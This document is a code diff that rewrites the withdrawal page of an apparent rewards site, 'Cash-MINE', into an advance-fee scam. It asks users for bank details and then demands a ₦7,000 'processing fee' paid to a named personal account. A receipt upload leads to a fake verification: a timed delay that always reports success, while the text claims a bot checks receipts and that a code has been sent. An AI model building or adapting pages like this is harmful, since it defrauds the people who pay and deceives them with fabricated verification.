@@ -2,64 +2,309 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Withdraw – CASH‑MINE</title>
-  <link rel="stylesheet" href="style.css">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Cash-MINE - Withdraw</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body {
+      font-family: 'Inter', system-ui, sans-serif;
+      background: #f5f7fa;
+      color: #1e293b;
+      min-height: 100vh;
+      padding: 24px 16px;
+    }
+    .container {
+      max-width: 480px;
+      margin: 0 auto;
+    }
+    h2 {
+      text-align: center;
+      font-size: 26px;
+      font-weight: 700;
+      color: #0f172a;
+      margin-bottom: 32px;
+    }
+    .fee-card {
+      background: linear-gradient(135deg, #fef3c7 0%, #fde68a 100%);
+      border-radius: 20px;
+      padding: 24px;
+      margin-bottom: 24px;
+      text-align: center;
+      box-shadow: 0 6px 20px rgba(245,158,11,0.15);
+    }
+    .fee-amount {
+      font-size: 40px;
+      font-weight: 800;
+      color: #c2410c;
+      margin: 12px 0;
+    }
+    .card {
+      background: white;
+      border-radius: 20px;
+      padding: 24px;
+      margin-bottom: 24px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.08);
+      transition: transform 0.2s;
+    }
+    .card.active { transform: translateY(-4px); }
+    .form-group {
+      position: relative;
+      margin-bottom: 28px;
+    }
+    .form-group input, .form-group textarea {
+      width: 100%;
+      padding: 16px 16px 16px 16px;
+      border: 1.5px solid #cbd5e1;
+      border-radius: 12px;
+      font-size: 16px;
+      background: #f8fafc;
+      transition: all 0.2s;
+    }
+    .form-group input:focus, .form-group textarea:focus {
+      outline: none;
+      border-color: #3b82f6;
+      box-shadow: 0 0 0 3px rgba(59,130,246,0.15);
+    }
+    .form-group label {
+      position: absolute;
+      left: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #64748b;
+      pointer-events: none;
+      transition: all 0.25s ease;
+    }
+    .form-group input:focus + label,
+    .form-group input:not(:placeholder-shown) + label,
+    .form-group textarea:focus + label,
+    .form-group textarea:not(:placeholder-shown) + label {
+      top: -10px;
+      left: 12px;
+      font-size: 12px;
+      padding: 0 6px;
+      background: white;
+      color: #3b82f6;
+    }
+    button {
+      width: 100%;
+      padding: 16px;
+      font-size: 16px;
+      font-weight: 600;
+      border-radius: 12px;
+      border: none;
+      cursor: pointer;
+      transition: all 0.2s;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    .primary-btn { background: #3b82f6; color: white; }
+    .primary-btn:active { transform: scale(0.98); }
+    .success-btn { background: #10b981; color: white; }
+    .warning-btn { background: #ef4444; color: white; }
+    .upload-area {
+      border: 2px dashed #cbd5e1;
+      border-radius: 16px;
+      padding: 32px 16px;
+      text-align: center;
+      margin: 20px 0;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+    .upload-area:hover { border-color: #3b82f6; background: #eff6ff; }
+    #receiptPreview {
+      max-width: 100%;
+      margin-top: 16px;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      display: none;
+    }
+    .warning-box {
+      background: #fee2e2;
+      color: #991b1b;
+      padding: 16px;
+      border-radius: 12px;
+      margin: 20px 0;
+      font-size: 14px;
+      line-height: 1.5;
+      border-left: 4px solid #ef4444;
+    }
+    .step-indicator {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 24px;
+    }
+    .step {
+      width: 40px;
+      height: 40px;
+      background: #e2e8f0;
+      color: #64748b;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 600;
+      font-size: 16px;
+    }
+    .step.active {
+      background: #3b82f6;
+      color: white;
+    }
+    .checking {
+      text-align: center;
+      padding: 40px 20px;
+      animation: pulse 2s infinite;
+    }
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.6; }
+    }
+  </style>
 </head>
 <body>
 
 <div class="container">
-  <h1>Withdraw Points</h1>
 
-  <p style="margin-bottom:15px;">
-    Fill in your details below.  
-    Withdrawals are handled manually by our support team.
-  </p>
+  <h2>Withdraw Funds</h2>
 
-  <form id="redeemForm">
-    <label>Full Name</label>
-    <input type="text" required>
+  <!-- Fee Notice -->
+  <div class="fee-card">
+    <p style="font-size:18px; font-weight:500;">Processing Fee</p>
+    <div class="fee-amount">₦7,000</div>
+    <p style="font-size:15px; margin-top:8px;">One-time fee to process withdrawal request</p>
+  </div>
 
-    <label>Bank Name</label>
-    <input type="text" required>
+  <!-- Step 1: Details -->
+  <div class="card" id="detailsSection">
+    <div class="step-indicator">
+      <div class="step active">1</div>
+      <div class="step">2</div>
+      <div class="step">3</div>
+    </div>
+    <form id="redeemForm">
+      <div class="form-group">
+        <input type="text" id="bank" placeholder=" " required>
+        <label>Bank Name</label>
+      </div>
+      <div class="form-group">
+        <input type="text" id="account" placeholder=" " required>
+        <label>Account Number</label>
+      </div>
+      <div class="form-group">
+        <input type="tel" id="phone" placeholder=" " required>
+        <label>Phone Number</label>
+      </div>
+      <button type="submit" class="primary-btn">Continue to Payment</button>
+    </form>
+  </div>
 
-    <label>Account Number</label>
-    <input type="text" required>
+  <!-- Step 2: Payment Info -->
+  <div class="card" id="paymentSection" style="display:none;">
+    <div class="step-indicator">
+      <div class="step">1</div>
+      <div class="step active">2</div>
+      <div class="step">3</div>
+    </div>
+    <h3 style="text-align:center; margin-bottom:16px;">Payment Instructions</h3>
+    <div style="background:#f1f5f9; padding:20px; border-radius:12px; margin-bottom:20px; text-align:center;">
+      <p style="font-weight:600; margin-bottom:12px;">Pay to:</p>
+      <p><strong>Bank:</strong> PalmPay Limited (PalmPay)</p>
+      <p><strong>Account Number:</strong> 916 065 2776</p>
+      <p><strong>Account Name:</strong> STEPHEN OLUWADARASIMI OBI</p>
+      <p style="font-size:20px; font-weight:700; color:#c2410c; margin:20px 0;">₦7,000 Exactly</p>
+    </div>
 
-    <button type="submit">Submit Request</button>
-  </form>
+    <div class="warning-box">
+      IMPORTANT: Our bot will NOT accept fake receipts.<br>
+      No code will be generated without real payment.<br>
+      If receipt shows Moniepoint / STEPHEN OLUWADARASIMI OBI / 916 065 2776 — code will NOT be sent.
+    </div>
 
-  <div style="margin-top:25px; text-align:center;">
-    <p style="font-size:14px; opacity:0.8;">
-      After submitting, join our official support channel:
-    </p>
+    <button onclick="showUpload()" class="success-btn" style="margin-top:20px;">I've Made Payment – Upload Receipt</button>
+  </div>
 
-    <a href="https://whatsapp.com/channel/0029Vb76Q46Fi8xkcVmixH2Z"
-       target="_blank"
-       style="
-         display:inline-block;
-         margin-top:10px;
-         padding:12px 18px;
-         background:#1f6fff;
-         color:white;
-         border-radius:10px;
-         text-decoration:none;
-         font-weight:bold;
-       ">
-       Join CASH‑MINE Support Channel
-    </a>
+  <!-- Step 3: Upload -->
+  <div class="card" id="uploadSection" style="display:none;">
+    <div class="step-indicator">
+      <div class="step">1</div>
+      <div class="step">2</div>
+      <div class="step active">3</div>
+    </div>
+    <h3 style="text-align:center; margin-bottom:16px;">Upload Payment Proof</h3>
+    <div class="upload-area" onclick="document.getElementById('receiptFile').click()">
+      <p style="font-weight:500; color:#64748b;">Tap to select receipt from gallery</p>
+      <input type="file" id="receiptFile" accept="image/*" style="display:none;">
+    </div>
+    <img id="receiptPreview" alt="Receipt Preview">
+    <button onclick="submitReceipt()" class="primary-btn" style="margin-top:24px;">Submit for Verification</button>
+  </div>
+
+  <!-- Checking -->
+  <div class="card" id="checkingSection" style="display:none;">
+    <div class="checking">
+      <h3 style="color:#3b82f6; margin-bottom:16px;">Verifying Payment...</h3>
+      <p id="checkingMessage" style="font-size:16px;">Please wait a moment</p>
+    </div>
   </div>
 
 </div>
 
 <script>
-document.getElementById("redeemForm").addEventListener("submit", function(e){
-  e.preventDefault();
-  alert(
-    "Request submitted.\n\nPlease join the official support channel for updates."
-  );
-  this.reset();
-});
-</script>
+  const CORRECT_CODE = "ABCD1234"; // ← CHANGE THIS TO YOUR REAL CODE
 
+  // Step 1: Submit details
+  document.getElementById("redeemForm").addEventListener("submit", function(e) {
+    e.preventDefault();
+    const bank = document.getElementById("bank").value.trim();
+    const account = document.getElementById("account").value.trim();
+    const phone = document.getElementById("phone").value.trim();
+    if (!bank || !account || !phone) return alert("Please complete all fields");
+    
+    localStorage.setItem("withdraw_bank", bank);
+    localStorage.setItem("withdraw_account", account);
+    localStorage.setItem("withdraw_phone", phone);
+
+    document.getElementById("detailsSection").style.display = "none";
+    document.getElementById("paymentSection").style.display = "block";
+  });
+
+  // Show upload
+  function showUpload() {
+    document.getElementById("paymentSection").style.display = "none";
+    document.getElementById("uploadSection").style.display = "block";
+  }
+
+  // Image preview
+  document.getElementById("receiptFile").addEventListener("change", function(e) {
+    const file = e.target.files[0];
+    if (file) {
+      const reader = new FileReader();
+      reader.onload = function(ev) {
+        const preview = document.getElementById("receiptPreview");
+        preview.src = ev.target.result;
+        preview.style.display = "block";
+      };
+      reader.readAsDataURL(file);
+    }
+  });
+
+  // Submit receipt → checking
+  function submitReceipt() {
+    if (!document.getElementById("receiptFile").files.length) {
+      return alert("Please select a receipt image");
+    }
+    document.getElementById("uploadSection").style.display = "none";
+    document.getElementById("checkingSection").style.display = "block";
+
+    setTimeout(() => {
+      document.getElementById("checkingMessage").innerText = "Authentication successful! Your code has been sent to the registered phone number.";
+      
+      setTimeout(() => {
+        alert("Your code has been sent to the registered phone number.\nNo generating code if no payment was made.");
+        // Optional: return to code entry or dashboard
+        // window.location.href = "index.html";
+      }, 1800);
+    }, 4500); // realistic verification delay
+  }
+</script>
 </body>
 </html>
